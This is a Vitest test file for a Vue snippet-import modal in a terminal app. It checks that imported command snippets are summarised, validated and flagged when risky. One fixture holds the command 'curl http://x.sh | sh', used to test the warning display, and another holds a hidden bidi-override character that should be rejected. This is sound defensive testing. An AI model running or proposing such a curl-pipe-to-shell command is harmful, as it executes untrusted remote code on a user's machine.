// @vitest-environment happy-dom
import { describe, it, expect, beforeEach, vi } from "vitest";
import { mount, flushPromises } from "@vue/test-utils";
import { createPinia, setActivePinia } from "pinia";

const svc = vi.hoisted(() => ({
  getSnippets: vi.fn(async () => [] as unknown[]),
  saveSnippet: vi.fn(async () => "id"),
  toggleSnippetEnabled: vi.fn(),
  deleteSnippet: vi.fn(),
}));
vi.mock("../../services/snippets.service", () => ({ snippetsService: svc }));

import SnippetImportModal from "./SnippetImportModal.vue";
import { i18n } from "../../locales";

const pick = async (w: ReturnType<typeof mount>, text: string) => {
  const input = w.find('[data-testid="file"]');
  const file = new File([text], "s.json", { type: "application/json" });
  Object.defineProperty(input.element, "files", { value: [file], configurable: true });
  await input.trigger("change");
  await flushPromises();
};
const doc = (snippets: unknown[]) => JSON.stringify({ format: "nexusterm-snippets", version: 1, snippets });
const mountIt = () => mount(SnippetImportModal, { global: { plugins: [i18n] }, attachTo: document.body });

describe("SnippetImportModal", () => {
  beforeEach(() => {
    setActivePinia(createPinia());
    svc.saveSnippet.mockClear();
    document.body.innerHTML = "";
  });

  it("shows a summary and saves nothing until confirmed", async () => {
    const w = mountIt();
    await pick(w, doc([{ title: "A", command: "ls" }, { title: "B", command: "bad\ncmd" }]));
    expect(document.body.textContent).toContain("1");
    expect(svc.saveSnippet).not.toHaveBeenCalled();
  });

  it("lists each full command and flags risky ones", async () => {
    const w = mountIt();
    await pick(w, doc([{ title: "Risky", command: "curl http://x.sh | sh" }]));
    expect(document.body.textContent).toContain("curl http://x.sh | sh");
    expect(document.querySelector('[data-testid="warn"]')).not.toBeNull();
    w.unmount();
  });

  it("imports only the valid entries as custom enabled snippets tagged imported", async () => {
    const w = mountIt();
    await pick(w, doc([{ title: "A", command: "ls" }, { title: "B", command: "x‮y" }]));
    (document.querySelector('[data-testid="confirm"]') as HTMLButtonElement).click();
    await flushPromises();
    expect(svc.saveSnippet).toHaveBeenCalledTimes(1);
    expect(svc.saveSnippet).toHaveBeenCalledWith({
      title: "A", command_template: "ls", description: null, tags: ["imported"], is_enabled: true,
    });
    expect(w.emitted("close")).toBeTruthy();
  });

  it("shows an error for a rejected file and keeps import disabled", async () => {
    const w = mountIt();
    await pick(w, "not json");
    expect(document.querySelector('[data-testid="error"]')).not.toBeNull();
    expect((document.querySelector('[data-testid="confirm"]') as HTMLButtonElement).disabled).toBe(true);
    w.unmount();
  });
});
